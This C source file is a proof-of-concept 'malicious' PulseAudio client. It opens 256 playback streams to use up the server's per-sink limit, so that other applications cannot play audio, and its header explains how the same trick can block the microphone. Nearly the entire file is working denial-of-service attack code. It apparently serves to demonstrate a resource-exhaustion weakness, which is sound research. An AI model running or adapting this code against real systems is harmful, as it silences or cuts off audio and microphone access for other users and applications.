/*
 * Malicious PA client: Exhaust open streams
 *
 * Copyright (C) 2016 Ahmed S. Darwish <darwish.07@gmail.com>
 *
 * SPDX-License-Identifier: GPL-2.0+
 *
 * PulseAudio has a hard-coded limit of 256 open streams (sink-inputs)
 * per sink. Exhaust this limit so that other honest apps won't be able
 * to connect new streams to default sink, effectively prohibiting them
 * from outputting any audio and _force-muting_ the system.
 *
 * After running this program, apps will basically get this message
 * from server:
 *
 *     Failed to create sink input: too many inputs per sink
 *
 * Check server commit 26bf2df903b1, "sink: Increase max sink inputs
 * per sink", for further details.
 *
 * An exactly similar attack can be created, effectively prohibiting
 * other apps from accessing default microphone, by creating 256
 * source-outputs. That is, reading streams connected to source using
 * pa_stream_connect_record().
 *
 * Check server commit e9768d9aac8c, "source: Increase max outputs
 * per source", for further details.
 */

#include <assert.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <pulse/context.h>
#include <pulse/error.h>
#include <pulse/mainloop.h>
#include <pulse/mainloop-api.h>
#include <pulse/mainloop-signal.h>
#include <pulse/operation.h>
#include <pulse/proplist.h>
#include <pulse/sample.h>
#include <pulse/stream.h>

#include "common.h"

/*
 * Max value since PulseAudio v5.0, commit 26bf2df903b1
 */
#define PA_MAX_INPUTS_PER_SINK 256

/*
 * Context sent to all of our asynchronous callbacks
 */
struct context {
    pa_mainloop_api *mainloop_api;      /* Pulse abstract mainloop API vtable */
    pa_context *context;                /* PA Connection handle between client & server */
};

/*
 * Gracefully stop PA event loop before exit
 */
static void quit(struct context *ctx, int ret) {
    assert(ctx->mainloop_api);
    assert(ret == EXIT_SUCCESS || ret == EXIT_FAILURE);

//  ctx->mainloop_api->quit(ctx->mainloop_api, ret);
//  exit(ret);
}

/*
 * Stream state callbacks
 *
 * A 'stream' represents a data path between the client and server.
 * Sample streams include a playback stream, a recording stream, or
 * a file upload stream.
 *
 * A single client-server connection ('context') can have multiple
 * streams. Each stream can have its own latency and time fragment
 * requirements through PulseAudio buffer attributes. A stream can
 * be moved to a different sink during its lifetime.
 */
static void stream_state_callback(pa_stream *stream, void *userdata) {
    struct context *ctx = userdata;

    assert(ctx);
    assert(ctx->context);

    switch (pa_stream_get_state(stream)) {
    case PA_STREAM_CREATING:
    case PA_STREAM_TERMINATED:
        break;

    case PA_STREAM_READY:
        out("Playback stream succesfully created");
        break;

    case PA_STREAM_FAILED:
    default:
        error("Playback stream error: %s",
              pa_strerror(pa_context_errno(ctx->context)));
        goto fail;
    }

    return;

fail:
    quit(ctx, EXIT_FAILURE);
}

/*
 * Callback to be called whenever new data may be written to the
 * playback data stream
 */
static void stream_write_callback(pa_stream *stream, size_t length, void *userdata) {
    return;
}

/*
 * Context state callbacks
 *
 * A 'context' represents the connection handle between a PulseAudio
 * client and its server. It multiplexes everything in that connection
 * including data streams , bi-directional commands, and events.
 */
static void context_state_callback(pa_context *context, void *userdata) {
    struct context *ctx = userdata;
    struct pa_sample_spec spec = { .format = PA_SAMPLE_S16LE, .rate = 44100, .channels = 2, };
    pa_stream *stream;
    int ret;

    assert(ctx);

    switch (pa_context_get_state(context)) {
    case PA_CONTEXT_AUTHORIZING:
    case PA_CONTEXT_CONNECTING:
    case PA_CONTEXT_SETTING_NAME:
        break;

    case PA_CONTEXT_READY:
        out("Connection established with PulseAudio sound server");

        /* Exhaust open streams */
        for (int i = 0; i < PA_MAX_INPUTS_PER_SINK; i++) {
	    stream = pa_stream_new(context, "playback stream", &spec, NULL);

            if (!stream) {
                error("FINISHED ALL STREAMS");
                goto fail;
            }

            pa_stream_set_state_callback(stream, stream_state_callback, userdata);
            pa_stream_set_write_callback(stream, stream_write_callback, userdata);

            /* Connect this stream with a sink chosen by PulseAudio */
            ret = pa_stream_connect_playback(stream, NULL, NULL, 0, NULL, NULL);
            if (ret < 0) {
                error("pa_stream_connect_playback() failed: %s",
                        pa_strerror(pa_context_errno(context)));
                goto fail;
            }
        }

        break;

    case PA_CONTEXT_TERMINATED:
        exit(EXIT_SUCCESS);
        break;

    case PA_CONTEXT_FAILED:
    default:
        error("PulseAudio context connection failure: %s",
              pa_strerror(pa_context_errno(context)));
        goto fail;
    }

    return;

fail:
    quit(ctx, EXIT_FAILURE);
}

int main(int argc, char **argv) {
    pa_proplist *proplist = NULL;
    pa_mainloop *m = NULL;
    pa_mainloop_api *api = NULL;
    pa_context *context = NULL;
    struct context *ctx;
    int ret;

    ctx = malloc(sizeof(struct context));
    if (!ctx) {
        errorp("Couldn't allocate async callbacks context");
        goto quit;
    }

    memset(ctx, 0, sizeof(*ctx));

    proplist = pa_proplist_new();
    if (!proplist) {
        error("Couldn't create a PulseAudio property list");
        goto quit;
    }

    pa_proplist_sets(proplist, PA_PROP_APPLICATION_NAME, "malicious-client-exhaust-open-streams");

    m = pa_mainloop_new();
    if (!m) {
        error("Couldn't create PulseAudio mainloop");
        goto quit;
    }

    api = pa_mainloop_get_api(m);
    context = pa_context_new_with_proplist(api, NULL, proplist);
    if (!context) {
        error("Couldn't create client context");
        goto quit;
    }

    ctx->mainloop_api = api;
    ctx->context = context;
    pa_context_set_state_callback(context, context_state_callback, ctx);

    ret = pa_context_connect(context, NULL, 0, NULL);
    if (ret < 0) {
        error ("Couldn't connect to PulseAudio server: %s",
               pa_strerror(pa_context_errno(context)));
        goto quit;
    }

    pa_mainloop_run(m, &ret);

    return ret;

 quit:
     exit(EXIT_FAILURE);
}
